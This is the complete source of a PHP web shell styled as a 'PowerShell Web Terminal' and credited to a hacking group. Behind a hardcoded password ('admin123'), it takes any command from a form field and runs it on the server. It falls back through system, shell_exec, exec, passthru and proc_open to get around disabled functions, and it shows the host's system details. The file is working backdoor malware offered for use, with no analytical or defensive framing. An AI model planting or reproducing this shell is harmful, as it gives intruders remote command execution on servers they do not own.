    <?php
    error_reporting(0);
    $PASSWORD = "admin123";

    if (!isset($_POST['pass']) || $_POST['pass'] !== $PASSWORD) {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Login</title>
            <style>
                body { font-family: Arial; background: #222; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .login-box { background: #333; padding: 30px; border-radius: 10px; width: 300px; }
                input, button { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
                button { background: #4CAF50; color: white; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Authentication Required</h2>
                <form method="POST">
                    <input type="password" name="pass" placeholder="Enter Password" required>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>';
        exit;
    }

    // Execute command
    $output = '';
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        
        if (function_exists('system')) {
            ob_start();
            system($cmd);
            $output = ob_get_clean();
        } elseif (function_exists('shell_exec')) {
            $output = shell_exec($cmd);
        } elseif (function_exists('exec')) {
            exec($cmd, $output);
            $output = implode("\n", $output);
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($cmd);
            $output = ob_get_clean();
        } elseif (function_exists('proc_open')) {
            $descriptors = [
                0 => ["pipe", "r"], // stdin
                1 => ["pipe", "w"], // stdout
                2 => ["pipe", "w"]  // stderr
            ];
            
            $process = proc_open($cmd, $descriptors, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        }
    }

    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>PowerShell Web Terminal</title>
        <style>
            body {
                font-family: Consolas, monospace;
                background: #1e1e1e;
                color: #00ff00;
                margin: 0;
                padding: 20px;
            }
            .terminal {
                background: #000;
                padding: 20px;
                border-radius: 5px;
                height: 80vh;
                overflow: auto;
            }
            .prompt {
                color: #00ffff;
            }
            input {
                background: transparent;
                border: none;
                color: #00ff00;
                font-family: Consolas, monospace;
                font-size: 14px;
                width: 80%;
                outline: none;
            }
            .output {
                white-space: pre-wrap;
                word-wrap: break-word;
                margin: 10px 0;
            }
            .header {
                background: #333;
                padding: 10px;
                border-radius: 5px;
                margin-bottom: 10px;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h3>PowerShell Web Terminal</h3>
            <p>Server: <?php echo php_uname(); ?></p>
            <form method="POST" style="display: inline;">
                <input type="hidden" name="pass" value="<?php echo htmlspecialchars($PASSWORD); ?>">
                <input type="submit" value="Logout" onclick="this.form.action='?'">
            </form>
        </div>
        
        <div class="terminal">
            <?php if ($output): ?>
            <div class="output">
                <strong>Output:</strong><br>
                <?php echo htmlspecialchars($output); ?>
            </div>
            <hr>
            <?php endif; ?>
            
            <form method="POST" id="cmdForm">
                <input type="hidden" name="pass" value="<?php echo htmlspecialchars($PASSWORD); ?>">
                <span class="prompt"><?php echo getcwd(); ?> $ </span>
                <input type="text" name="cmd" id="cmd" autofocus placeholder="Enter command...">
            </form>
            
            <div style="margin-top: 20px; color: #888;">
                <h4>Credit:</h4>
                <ul>
                    <li><code>cmd php</code> - @RibelCyberTeam</li>
                </ul>
            </div>
        </div>
        
        <script>
            document.getElementById('cmd').focus();
            document.getElementById('cmdForm').onsubmit = function() {
                var cmd = document.getElementById('cmd').value;
                if (cmd.trim() === '') return false;
            };
        </script>
    </body>
    </html>